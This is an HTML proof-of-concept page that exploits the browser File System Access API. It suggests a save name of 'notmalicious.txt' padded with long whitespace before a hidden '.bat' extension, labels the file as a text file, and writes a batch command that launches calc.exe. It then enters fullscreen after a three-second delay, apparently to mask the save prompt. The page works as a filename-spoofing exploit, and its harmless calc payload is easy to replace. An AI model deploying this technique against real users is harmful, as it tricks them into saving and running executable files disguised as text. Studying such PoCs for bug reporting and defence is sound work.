<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Save then Fullscreen (PoC)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body{font-family:system-ui, -apple-system, "Segoe UI", Roboto, Arial; padding:24px; background:#f7fafc;}
    .card{max-width:720px;background:#fff;padding:18px;border-radius:10px;box-shadow:0 8px 24px rgba(2,6,23,.06)}
    h1{margin:0 0 8px;font-size:18px}
    p{margin:0 0 12px;color:#374151}
    button{font-size:20px;padding:12px 18px;border-radius:8px;border:0;background:#2563eb;color:#fff;cursor:pointer}
    .status{margin-top:12px;color:#4b5563}
  </style>
</head>
<body>
  <div class="card">
    <h1>Save file â†’ Enter fullscreen (auto-exit)</h1>
    <p>Click <strong>Save image</strong>. File picker will open, file will be written, then the page will enter fullscreen (3s delay). It will automatically exit fullscreen after 3s.</p>
    <button id="addNewFile">Save image</button>
    <div id="status" class="status">Status: idle</div>
  </div>

<script>
(async () => {
  const btn = document.getElementById('addNewFile');
  const statusEl = document.getElementById('status');

  function setStatus(text){
    statusEl.textContent = 'Status: ' + text;
  }

  function delay(ms){ return new Promise(resolve => setTimeout(resolve, ms)); }

  async function saveFileViaPicker(){
    if (!('showSaveFilePicker' in window)) {
      throw new Error('File System Access API not supported in this context (HTTPS or localhost required).');
    }

    const options = {
      suggestedName: 'notmalicious.txt                                                                                                                                       .bat',
      types: [{
        description: 'Text file',
        accept: { 'text/plain': ['.bat'] },
      }],
    };

    const handle = await window.showSaveFilePicker(options);
    const writable = await handle.createWritable();
    // Example content; change as needed
    await writable.write('C:\\Windows\\System32\\calc.exe');
    await writable.close();
  }

  btn.addEventListener('click', async () => {
    btn.disabled = true;
    setStatus('Opening save dialog (user gesture) ...');

    try {
      // 1) Show save file picker and write file (this must be triggered by user gesture)
      await saveFileViaPicker();
      setStatus('File saved. Waiting 3s before entering fullscreen...');

      // 2) Delay 3s but keep this inside the same async chain so gesture is preserved
      await delay(3000);

      // 3) Enter fullscreen (still allowed because we stayed in the same user-initiated chain)
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
        setStatus('Entered fullscreen. Will exit fullscreen after 3s.');
      } else {
        setStatus('Fullscreen API not supported in this browser.');
        btn.disabled = false;
        return;
      }

      // 4) Auto-exit fullscreen after 3s (for demo)
      setTimeout(async () => {
        if (document.fullscreenElement) {
          try {
            await document.exitFullscreen();
            setStatus('Exited fullscreen.');
          } catch (err) {
            console.error('exitFullscreen error', err);
            setStatus('Failed to exit fullscreen: ' + (err && (err.message || err.name)));
          }
        } else {
          setStatus('Not in fullscreen anymore.');
        }
        btn.disabled = false;
      }, 3000);

    } catch (err) {
      console.error(err);
      // Friendly status messages depending on error
      if (err.name === 'AbortError') setStatus('Save cancelled by user.');
      else if (err.name === 'NotAllowedError' || err.name === 'SecurityError') setStatus('Permission denied or insecure context.');
      else setStatus('Error: ' + (err.message || err.name || 'unknown'));
      btn.disabled = false;
    }
  });

  // Update status if user exits fullscreen manually
  document.addEventListener('fullscreenchange', () => {
    if (!document.fullscreenElement) {
      setStatus('Exited fullscreen.');
      btn.disabled = false;
    }
  });
})();
</script>
</body>
</html>
